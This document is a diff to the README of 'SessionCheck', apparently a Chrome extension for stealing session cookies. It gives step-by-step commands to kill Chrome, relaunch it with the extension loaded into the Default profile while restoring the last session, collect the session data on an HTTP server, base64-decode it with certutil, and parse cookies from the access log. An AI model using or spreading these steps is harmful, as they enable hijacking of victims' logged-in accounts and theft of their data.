@@ -10,7 +10,7 @@ Typical way to use SessionCheck:
 1. Launch an HTTP server to retrieve session information
 1. Place SessionCheck under a directory
 1. Terminate all Chrome processes
-1. Launch Chrome again with `--load-extension` and `--profile-directory` (optional)
+1. Launch Chrome again with `--load-extension` and `--profile-directory`
 1. SessionCheck sends session information to the HTTP server
 1. You can see the session information in the access log (see the Example section)
 
@@ -42,7 +42,7 @@ taskkill /f /im:chrome.exe
 Load this extension:
 
 ```
-"C:\Program Files\Google\Chrome\Application\chrome.exe" --profile-directory="Default" --load-extension="C:/Path/to/SessionCheckDirectory"
+"C:\Program Files\Google\Chrome\Application\chrome.exe" --profile-directory="Default" --load-extension="C:/Path/to/SessionCheckDirectory" --restore-last-session
 ```
 
 Base64 decode:
@@ -50,4 +50,7 @@ Base64 decode:
 certutil -decode b64text.txt decoded.json
 ```
 
-
+Extract cookie data from access.log
+```
+python3 ./parsesession.py -i test1234 -f ./access.log > cookie.json
+```
